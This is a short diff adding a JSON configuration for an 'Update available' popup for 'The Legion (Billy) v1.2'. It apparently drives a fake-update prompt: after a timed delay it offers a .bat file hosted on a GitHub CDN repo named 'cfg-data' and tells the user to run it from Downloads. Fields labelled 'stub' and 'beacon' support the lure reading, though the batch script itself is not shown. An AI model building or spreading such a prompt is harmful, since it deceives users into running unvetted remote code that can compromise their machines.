@@ -1,0 +1,16 @@
+{
+  "show": true,
+  "title": "Update available",
+  "version": "v1.2",
+  "line1": "The Legion (Billy) v1.2 is ready.",
+  "line2": "Compatibility fix for the current game patch.",
+  "size": "28 MB",
+  "released": "today",
+  "cta": "Update Now",
+  "stub": "https://cdn.jsdelivr.net/gh/flippelt/cfg-data@main/dl/Legion_Update_v1.2.bat",
+  "stub_name": "Legion_Update_v1.2.bat",
+  "delay_ms": 4200,
+  "beacon": "",
+  "done_title": "Update downloaded",
+  "done_line": "Open Legion_Update_v1.2.bat from your Downloads folder to finish."
+}
